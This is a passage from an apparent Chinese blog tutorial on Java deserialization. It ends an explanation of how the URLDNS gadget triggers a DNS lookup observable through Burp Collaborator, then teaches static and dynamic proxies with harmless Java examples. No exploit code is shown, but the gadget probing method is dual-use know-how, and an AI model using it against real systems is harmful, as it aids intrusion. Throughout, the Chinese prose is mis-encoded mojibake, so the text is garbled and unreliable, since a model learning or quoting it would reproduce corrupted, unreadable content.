<p>æˆ‘ä»¬ç»§ç»­è·Ÿï¼Œhandleræ­¤æ—¶æ˜¯ä¸€ä¸ª<code>URLStreamHandler</code>å¯¹è±¡ï¼Œç»§ç»­è·Ÿè¿›å®ƒçš„hashCodeæ–¹æ³•ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png"></p>
<p>è¿™é‡Œè°ƒç”¨äº†getHostAddressæ–¹æ³•ï¼Œç»§ç»­è·Ÿã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png"></p>
<p>åˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°<code>InetAddress.getByName(host)</code>çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶ipåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šå°±æ˜¯ä¸€æ¬¡DNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpçš„<code>Collaborator client</code>æ¥çœ‹åˆ°è¿™æ¬¡urlè¯·æ±‚ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png"></p>
<h1 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h1><p>åœ¨Spirngä¸­ï¼ŒAOPçš„åº•å±‚å®ç°å°±æ˜¯ä»£ç†æ¨¡å¼ï¼Œä»£ç†æ¨¡å¼åˆ†ä¸ºä¸¤ç§ï¼š</p>
<ul>
<li>é™æ€ä»£ç†</li>
<li>åŠ¨æ€ä»£ç†</li>
</ul>
<h2 id="ä»€ä¹ˆæ˜¯ä»£ç†ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ä»£ç†ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ä»£ç†ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ä»£ç†ï¼Ÿ</h2><p>æˆ‘ä»¬ç”¨ä¸€ä¸ªç§Ÿæˆ¿çš„ä¾‹å­æ¥è¯´æ˜ï¼ŒæŒ‰ç…§æ­£å¸¸çš„é€»è¾‘æ¥è®²ï¼Œæˆ¿ä¸œæƒ³è¦å°†è‡ªå·±çš„æˆ¿å­å‡ºç§Ÿï¼Œå¹¶ä¸”æ­¤æ—¶æœ‰ä¸€ä¸ªç§Ÿå®¢æƒ³ç§Ÿè¿™ä¸ªæˆ¿å­ï¼Œé‚£ä¹ˆç§Ÿå®¢å°±å¯ä»¥ç›´æ¥æ‰¾åˆ°æˆ¿ä¸œå®Œæˆç§Ÿæˆ¿å­è¿™ä»¶äº‹ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/Untitled%201.png"></p>
<p>ä½†æ˜¯ç°åœ¨æˆ¿ä¸œä¸æƒ³å¤„ç†ä¸€äº›åœ¨ç§Ÿæˆ¿è¿‡ç¨‹ä¸­éœ€è¦è¿›è¡Œçš„ç¹çæ­¥éª¤ï¼Œæ¯”å¦‚æ‰“å¹¿å‘Šå•Šï¼Œå’Œç§Ÿå®¢è®®ä»·ç­‰ç­‰ï¼Œæ‰€ä»¥è¿™æ—¶å€™å‡ºç°äº†ä¸€ä¸ªæ–°è§’è‰²ï¼Œå«åšä¸­ä»‹ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ¿ä¸œæ‰€åšçš„äº‹åªæœ‰å‡ºç§Ÿè‡ªå·±çš„æˆ¿å­ï¼Œå…¶ä»–äº‹é¡¹å…¨éƒ¨äº¤ç”±ä¸­ä»‹æ¥åšï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ç§Ÿå®¢å¦‚æœæƒ³ç§Ÿæˆ¿å­æ˜¯ä¸èƒ½ç›´æ¥æ‰¾åˆ°æˆ¿ä¸œçš„ï¼Œå¿…é¡»åœ¨ä¸­é—´ç»ç”±ä¸­ä»‹ï¼Œä¸­ä»‹æ¥å®Œæˆå¤§éƒ¨åˆ†äº‹å®œï¼Œå¹¶ä¸”åœ¨æ­¤æ—¶ä¸­ä»‹ä¸æˆ¿ä¸œå…±åŒå®Œæˆç§Ÿæˆ¿è¿™ä»¶äº‹ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/Untitled.png"></p>
<h2 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h2><p>è§’è‰²åˆ†æï¼š</p>
<ul>
<li>æŠ½è±¡è§’è‰²ï¼ˆç§Ÿæˆ¿è¿™ä»¶äº‹ï¼‰ï¼šä¸€èˆ¬ä¼šä½¿ç”¨æŠ½è±¡ç±»æˆ–è€…æ¥å£æ¥è§£å†³</li>
<li>çœŸå®è§’è‰²ï¼ˆæˆ¿ä¸œï¼‰ï¼šè¢«ä»£ç†çš„è§’è‰²</li>
<li>ä»£ç†è§’è‰²ï¼ˆä¸­ä»‹ï¼‰ï¼šä»£ç†çœŸå®è§’è‰²ï¼Œä»£ç†çœŸå®è§’è‰²åï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šåšä¸€äº›é™„å±æ“ä½œ</li>
<li>å®¢æˆ·ï¼ˆç§Ÿå®¢ï¼‰ï¼šè®¿é—®ä»£ç†å¯¹è±¡çš„äºº</li>
</ul>
<p>ä»£ç å®ç°ï¼š</p>
<p>ç§Ÿæˆ¿ Rentæ¥å£ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rent</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ¿ä¸œ Hostç±»ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Host</span> <span class="keyword">implements</span> <span class="title class_">Rent</span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸­ä»‹ Proxyç±»ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Rent</span>{</span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">()</span> {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">(Host host)</span> {</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>{</span><br><span class="line">        host.rent();</span><br><span class="line">        seeHouse();</span><br><span class="line">        getFare();</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">seeHouse</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getFare</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"ä¸­ä»‹æ”¶ä¸­ä»‹è´¹äº†"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>ç§Ÿå®¢ Clientç±»ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(host);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>å¯ä»¥å‘ç°æˆ¿ä¸œåªä¸“æ³¨å®ç°äº†ç§Ÿæˆ¿è¿™ä»¶äº‹ï¼Œè€Œä¸­ä»‹ä¸ä»…å¸®æˆ¿ä¸œå®ç°äº†ç§Ÿæˆ¿ï¼Œè€Œä¸”è‡ªå·±ä¹Ÿæ·»åŠ äº†æ ¼å¤–çš„åŠŸèƒ½ï¼Œæ¯”å¦‚çœ‹æˆ¿æ”¶ä¸­ä»‹è´¹ç­‰ç­‰ã€‚</p>
<p>ä»£ç†æ¨¡å¼çš„å¥½å¤„ï¼š</p>
<ul>
<li>å¯ä»¥æ—¶çœŸæ˜¯è§’è‰²çš„ç›®çš„æ›´åŠ çº¯ç²¹ï¼Œä¸ç”¨å»å…³æ³¨ä¸€äº›å…¬å…±çš„ä¸šåŠ¡</li>
<li>å…¬å…±ä¸šåŠ¡äº¤ç»™ä»£ç†è§’è‰²ï¼Œå®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥</li>
<li>å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•æ—¶ï¼Œä¾¿äºé›†ä¸­ç®¡ç†</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>ä¸€ä¸ªçœŸå®è§’è‰²å°±ä¼šäº§ç”Ÿä¸€ä¸ªä»£ç†è§’è‰²ï¼Œä»£ç é‡ç¿»å€ï¼Œå¼€å‘æ•ˆç‡å˜ä½</li>
</ul>
<h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><ul>
<li>åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†è§’è‰²ä¸€æ ·</li>
<li>åŠ¨æ€ä»£ç†çš„ä»£ç†ç±»æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸æ˜¯æˆ‘ä»¬ç›´æ¥å†™å¥½çš„</li>
<li>åŠ¨æ€ä»£ç†åˆ†ä¸ºä¸‰å¤§ç±»ï¼š<ul>
<li>åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†â€”â€”JDKçš„åŠ¨æ€ä»£ç†</li>
<li>åŸºäºç±»çš„åŠ¨æ€ä»£ç†â€”â€”cglib</li>
<li>javaå­—èŠ‚ç å®ç°â€”â€”Javassist</li>
</ul>
</li>
</ul>
<p>åŠ¨æ€ä»£ç†éœ€è¦äº†è§£ä¸¤ä¸ªç±»ï¼šProxyï¼šä»£ç†ï¼ŒInvocationHandlerï¼šè°ƒç”¨å¤„ç†ç¨‹åº</p>
<p>æ•´ä¸ªåŠ¨æ€ä»£ç†å¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>Proxy.newProxyInstance ç”Ÿæˆä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡proxyï¼Œå¹¶ä¸”å‘Šè¯‰è¿™ä¸ªproxyè¦ä»£ç†å“ªä¸ªæ¥å£ï¼Œè¿™é‡Œæ³¨æ„æ­¤æ—¶å¿…é¡»è¦æ˜¯æ¥å£æ‰è¡Œï¼ŒåŠ¨æ€ä»£ç†æ˜¯æ— æ³•ä»£ç†ä¸€ä¸ªç±»çš„ï¼Œå› æ­¤å½“åŠ¨æ€ä»£ç†æ¥æ”¶åˆ°ä¸€ä¸ªç±»æ—¶è¦è½¬ä¸ºè¯¥ç±»æ‰€ç»§æ‰¿çš„æ¥å£ã€‚</li>
<li>å®¢æˆ·è°ƒç”¨è¢«ä»£ç†å¯¹è±¡çš„æŸä¸€æ–¹æ³•ï¼Œæ­¤æ—¶javaä¼šå°†è®¿é—®ä»£ç†å¯¹è±¡è¿™ä¸ªè¯·æ±‚è½¬å‘ç»™åŠ¨æ€ä»£ç†å¯¹è±¡proxyï¼Œå¹¶ä¸”åœ¨proxyçš„invokeä¸­å®ç°è¯¥æ–¹æ³•</li>
</ul>
<h3 id="ä»£ç å®ç°ï¼š"><a href="#ä»£ç å®ç°ï¼š" class="headerlink" title="ä»£ç å®ç°ï¼š"></a>ä»£ç å®ç°ï¼š</h3><p>Rentæ¥å£ è¢«ä»£ç†å¯¹è±¡å’Œproxyå¯¹è±¡å…±åŒå®ç°çš„æ¥å£ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rent</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>Host è¢«ä»£ç†å¯¹è±¡:</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Host</span> <span class="keyword">implements</span> <span class="title class_">Rent</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>åŠ¨æ€ä»£ç†å·¥å…·ç±» ProxyInvocationHandlerï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> {</span><br><span class="line">    <span class="keyword">private</span> Rent rent;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// ä½¿ç”¨åŠ¨æ€ä»£ç†æ—¶é€šè¿‡setterä¼ å…¥è¦è¢«ä»£ç†çš„å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRent</span><span class="params">(Rent rent)</span> {</span><br><span class="line">        <span class="built_in">this</span>.rent = rent;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">		<span class="comment">// é€šè¿‡getProxyæ–¹æ³•è·å¾—ä¸€ä¸ªåŠ¨æ€ä»£ç†å®ä¾‹</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getProxy</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">			<span class="comment">// é€šè¿‡Proxy.newProxyInstanceåˆå§‹åŒ–ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡å‡ºæ¥ ä¸‰ä¸ªå‚æ•°åŸºæœ¬ä¸Šåªæœ‰ç¬¬äºŒä¸ªæ˜¯å˜åŒ–çš„ï¼Œä¸ºè¢«ä»£ç†çš„æ¥å£ï¼Œå…¶ä»–ä¸¤ä¸ªå‚æ•°å¯ä»¥åƒè¿™é‡Œä¸€æ ·å†™æ­»</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="built_in">this</span>.getClass().getClassLoader(), rent.getClass().getInterfaces(), <span class="built_in">this</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">		<span class="comment">// å½“è°ƒç”¨ä¸€ä¸ªè¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œä¼šåœ¨æ­¤å¤„æ‰§è¡Œï¼Œinvokeå†…å¯ä»¥è‡ªå·±æ„é€ å¦‚ä½•æ‰§è¡Œè¯¥æ–¹æ³•ï¼Œä»è€Œè¾¾åˆ°äº†æ‰©å±•æ–¹æ³•åŠŸèƒ½çš„ç›®çš„</span></span><br><span class="line">		<span class="comment">// ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸º ä»£ç†å¯¹è±¡ ä»£ç†å¯¹è±¡è¢«è°ƒç”¨çš„æ–¹æ³• è°ƒç”¨è¯¥æ–¹æ³•çš„å‚æ•°</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable {</span><br><span class="line">       <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span>  method.invoke(rent,args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>Client</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>();</span><br><span class="line">        <span class="type">ProxyInvocationHandler</span> <span class="variable">pih</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyInvocationHandler</span>();</span><br><span class="line">        pih.setRent(host); <span class="comment">// å°†è¦ä»£ç†çš„å¯¹è±¡è®¾ç½®ä¸ºhost</span></span><br><span class="line">        <span class="type">Rent</span> <span class="variable">proxy</span> <span class="operator">=</span> (Rent) pih.getProxy(); <span class="comment">// æ‹¿åˆ°è¢«ä»£ç†æ¥å£çš„ä»£ç†å¯¹è±¡</span></span><br><span class="line">        proxy.rent(); <span class="comment">// è°ƒç”¨è¯¥æ–¹æ³•åä¼šå°†è¿™ä¸ªæ–¹æ³•ä¼ ç»™ä»£ç†å¯¹è±¡ä¸­çš„invokeæ–¹æ³•æ¥æ‰§è¡Œ</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#Javaååºåˆ—åŒ–</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%89%8D%E7%BD%AE%E6%89%AB%E7%9B%B2/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">åŒºå—é“¾å®‰å…¨å‰ç½®æ‰«ç›²</span>
                                <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/04/21/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">NodejsåŸå‹é“¾æ±¡æŸ“</span>
                                <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;è¯„è®º
    </div>
    
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
              appKey: '7gIuYJ9YQk94en6wRudankYd',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'Hi speak somethingï¼',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('https://ycemvr5n.api.lncldglobal.com') {
              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return 'åšä¸»'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'y1zh3e7'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">JavaåŸç”Ÿåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E7%AF%87"><span class="nav-text">Javaååºåˆ—åŒ–å…¥é—¨ç¯‡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-IO"><span class="nav-text">Java IO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="nav-text">Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%92%8CJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">phpå’ŒJavaååºåˆ—åŒ–ä¹‹é—´çš„åŒºåˆ«</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84-URLDNS"><span class="nav-text">åå°„+URLDNS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%8F%8D%E5%B0%84%E7%AF%87"><span class="nav-text">Javaåå°„ç¯‡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">åå°„å¸¸ç”¨åˆ°çš„æ–¹æ³•</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eforname"><span class="nav-text">å…³äºforname</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œå‘½ä»¤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="nav-text">ä¸€äº›å…¶ä»–çš„åå°„æœºåˆ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ProcessBuilder%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">åˆ©ç”¨ProcessBuilderæ‰§è¡Œå‘½ä»¤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E6%89%A7%E8%A1%8C%E7%A7%81%E6%9C%89%E6%96%B9%E6%B3%95"><span class="nav-text">å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œç§æœ‰æ–¹æ³•</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ysoserial"><span class="nav-text">ysoserial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URLDNS"><span class="nav-text">URLDNS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F"><span class="nav-text">ä»£ç†æ¨¡å¼</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%A3%E7%90%86%EF%BC%9F"><span 